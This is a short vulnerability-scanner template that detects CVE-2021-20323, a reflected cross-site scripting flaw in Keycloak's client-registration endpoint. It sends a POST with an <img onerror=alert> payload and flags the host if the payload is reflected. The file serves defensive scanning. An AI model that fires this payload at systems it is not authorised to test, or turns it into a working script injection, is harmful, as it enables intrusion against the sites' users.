metadata:
    language: v1-beta
    name: "CVE-2021-20323"
    description: "KeyCloak Post-Based reflected XSS | CVE-2021-20323"
    author: "Milad Fadavvi"
    tags: "injection,xss,rxss"

run for each:
    potential_path = "/auth/realms/master/clients-registrations/openid-connect"

given host then
    send request called check:
        method: "POST"
        path: {potential_path}
        body: "{\"<img src=x onerror=\\"alert('Bo0oq')\\"/>\":1}"
        headers: "Content-type": "application/json"

if "alert('Bo0oq')" in {check.response.body} and "org.keycloak" in {check.response.body}
    then
        report issue:
            severity: medium
            confidence: certain
            detail: `https://nvd.nist.gov/vuln/detail/CVE-2021-20323`
            remediation: "Update the KeyCloak!"
end if
